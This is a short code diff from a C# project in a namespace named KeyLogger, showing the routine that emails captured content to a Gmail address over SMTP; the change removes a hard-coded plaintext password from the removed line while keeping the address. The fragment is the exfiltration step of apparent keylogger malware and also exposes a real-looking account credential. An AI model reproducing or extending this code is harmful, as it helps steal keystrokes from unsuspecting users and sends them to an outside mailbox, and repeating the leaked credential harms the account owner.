@@ -179,7 +179,7 @@ namespace KeyLogger
                 mail.Body = content;
 
                 server.Port = 587;
-                server.Credentials = new NetworkCredential("chetan.project.try@gmail.com", "Project@Try123");
+                server.Credentials = new NetworkCredential("chetan.project.try@gmail.com", "");
                 server.EnableSsl = true;
                 server.Send(mail);
             }
